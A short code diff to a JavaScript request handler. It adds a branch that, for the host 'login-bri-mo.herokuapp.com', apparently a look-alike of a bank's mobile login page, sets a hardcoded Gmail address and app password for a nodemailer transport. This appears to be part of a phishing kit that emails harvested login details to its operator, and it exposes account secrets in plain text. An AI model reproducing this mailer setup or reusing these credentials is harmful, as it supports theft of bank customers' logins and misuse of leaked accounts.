@@ -27,6 +27,11 @@ export default function handler(req, res) {
         pass = 'rtzqphftdjkdrnwa';
         
     }
+    else if (url == 'login-bri-mo.herokuapp.com'){
+        email = 'nilabakar403@gmail.com';
+        pass = 'hpwgbnwdgdpryjpa';
+        
+    }
         
         try {
             const transporter = nodemailer.createTransport({
